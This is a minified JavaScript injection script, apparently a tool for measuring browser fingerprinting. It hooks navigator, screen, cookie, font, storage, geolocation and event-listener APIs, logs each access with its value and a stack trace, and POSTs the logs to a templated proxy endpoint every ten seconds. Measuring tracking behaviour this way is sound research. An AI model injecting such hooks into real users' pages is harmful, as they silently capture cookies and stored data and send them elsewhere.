if(void 0===Object.alreadyInjected){Object.alreadyInjected=!0;var monitorD={window:{navigator:{appCodeName:!0,appName:!0,appVersion:!0,cookieEnabled:!0,geolocation:!0,language:!0,languages:!0,onLine:!0,oscpu:!0,platform:!0,product:!0,productSub:!0,userAgent:!0,vendorSub:!0,vendor:!0,deviceMemory:!0,hardwareConcurrency:!0,plugins:!0},document:{hasStorageAccess:!0,requestStorageAccess:!0,cookie:!0,fonts:!0},screen:{pixelDepth:!0,colorDepth:!0},localStorage:!0,sessionStorage:!0}};Object.gpd0x=function(e,t){for(var r=Object.getOwnPropertyDescriptor(e,t),n=Object.getPrototypeOf(e);void 0===r&&null!==n;)r=Object.getOwnPropertyDescriptor(n,t),n=Object.getPrototypeOf(n);return r};var log_buffer=[];function send_log(){var e=new XMLHttpRequest;e.open("POST","${proxy_dest}",!0),e.setRequestHeader("Content-type","application/json"),e.send(JSON.stringify(log_buffer)),log_buffer=[],setTimeout(send_log,1e4)}function gst12(){var t="unknown";try{throw new Error}catch(e){t=(t=e.stack.split("\n"))[t.length-1]}return t}function iz1(e,r,n,t){var o=Object.gpd0x(e,n);if(void 0!==o&&!0===o.configurable){var i=o.get,a=o.set,c=o.value;Object.defineProperty(e,n,{configurable:!0,get:function(){var e;if(i)e=i.call(this);else{if(!("value"in o))return void console.error("Property descriptor for",r+"."+n,"doesn't have getter or value?");e=c}return t?t(r,n,e,window.location.href,gst12(),(new Date).getTime()):log_buffer.push({name:r+"."+n,property:e,location:document.location.href,trace:gst12(),time:(new Date).getTime()}),e},set:function(e){var t;if(a)t=a.call(this,e);else{if(!("value"in o))return console.error("Property descriptor for",r+"."+n,"doesn't have setter or value?"),e;t=c=e}return t}})}}function itr(object,base){for(var key in object)try{!0===object[key]?iz1(eval(base),base,key):object[key]instanceof Object&&itr(object[key],base+"."+key)}catch(e){}}function ind(e){iz1(e,"dynamic.style","fontFamily",function(e,t,r,n,o,i){log_buffer.push({name:e+"."+t,property:r.fontFamily,location:n,trace:o,time:i})})}function ie2(){var e=Object.gpd0x(document,"createElement"),t=(e.get,e.set),r=e.value;Object.defineProperty(document,"createElement",{configurable:!0,get:function(){return function(e){var t=r.call(document,e);return ind(t),t}},set:t})}function ips1(){var e=Object.gpd0x(window.navigator.geolocation,"getCurrentPosition"),t=(e.get,e.set),r=e.value;Object.defineProperty(window.navigator.geolocation,"getCurrentPosition",{configurable:!0,get:function(){return function(e){var t=r.call(window.navigator.geolocation,e);return log_buffer.push({name:"GPS location",property:[],location:location,trace:gst12(),time:(new Date).getTime()}),t}},set:t})}function iem(){var e=Object.gpd0x(window,"addEventListener"),t=(e.get,e.set),o=e.value;Object.defineProperty(window,"addEventListener",{configurable:!0,get:function(){return function(e,t,r){var n=o.bind(window)(e,t,r);return log_buffer.push({name:"EventListener",property:e,location:location,trace:gst12(),time:(new Date).getTime()}),n}},set:t})}ie2(),ips1(),iem(),itr(monitorD.window,"window"),setTimeout(send_log,1e4)}
